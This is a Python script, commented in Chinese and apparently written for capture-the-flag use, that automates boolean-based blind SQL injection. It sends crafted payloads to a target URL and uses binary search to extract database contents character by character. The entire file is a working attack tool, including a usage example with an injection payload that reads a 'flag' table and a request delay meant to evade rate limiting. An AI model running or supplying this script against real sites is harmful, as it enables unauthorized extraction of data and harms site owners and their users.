#!/usr/bin/env python3
"""
SQL 布尔盲注自动化脚本
适用于页面有真/假两种状态的注入点
二分法加速，支持中断恢复
"""

import requests
import sys
import time


def extract_flag(url, true_indicator, payload_template, start=1, end=50, delay=0):
    """
    url: 目标 URL（如 http://target.com/index.php?id=1）
    true_indicator: 真条件页面包含的字符串
    payload_template: 注入 payload，{pos} 替换字符位置，{char} 替换 ASCII 值
    start: 起始位置
    end: 结束位置
    delay: 请求间隔（秒），防止被限流
    """
    flag = ""
    for pos in range(start, end + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = payload_template.format(pos=pos, char=mid)
            try:
                r = requests.get(url + payload, timeout=10)
                if true_indicator in r.text:
                    low = mid + 1
                else:
                    high = mid - 1
            except requests.RequestException as e:
                print(f"[!] 请求异常: {e}")
                continue

            if delay:
                time.sleep(delay)

        if low - 1 <= 32:
            print(f"[-] 位置 {pos}: 空字符，flag 可能已结束")
            break

        flag += chr(low - 1)
        print(f"[+] 位置 {pos}: {chr(low - 1)} → flag: {flag}")

    print(f"\n[+] 最终结果: {flag}")
    return flag


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("用法: python3 sql_blind.py <URL> <真条件标识> <payload模板>")
        print("")
        print("示例:")
        print("  python3 sql_blind.py \"http://target/index.php?id=1\" \"success\" \"' and ascii(substr((select flag from flag),{pos},1))>{char}--+\"")
        print("")
        print("payload 中的 {pos} 替换为字符位置, {char} 替换为 ASCII 比较值")
        sys.exit(1)

    target_url = sys.argv[1]
    indicator = sys.argv[2]
    template = sys.argv[3]

    print(f"[*] URL: {target_url}")
    print(f"[*] 真条件: {indicator}")
    print(f"[*] Payload: {template}")
    print("[*] 开始注入...\n")

    extract_flag(target_url, indicator, template)
